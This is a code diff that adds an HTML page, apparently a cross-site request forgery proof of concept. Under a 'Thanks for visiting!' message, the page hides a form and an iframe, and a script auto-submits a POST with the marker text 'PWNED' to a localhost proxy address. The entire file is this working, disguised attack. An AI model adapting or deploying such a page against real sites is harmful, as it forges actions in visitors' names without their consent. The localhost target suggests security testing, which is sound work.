@@ -1,0 +1,33 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Home</title>
+  <style>
+    #theform{
+      display: none;
+    }
+    #hide{
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  Thanks for visiting! <a href="https://localhost.charlesproxy.com/">Go back</a>
+<div id="hide"><iframe name="hiddenFrame"></iframe></div>
+
+<form id="theform"
+      action="https://localhost.charlesproxy.com/"
+      method="post"
+      target="hiddenFrame">
+  <label for="message">Message:</label><br>
+  <textarea name="message">PWNED</textarea><br>
+  <input type="submit">
+</form>
+<script>
+  theform.submit()
+</script>
+</body>
+</html>
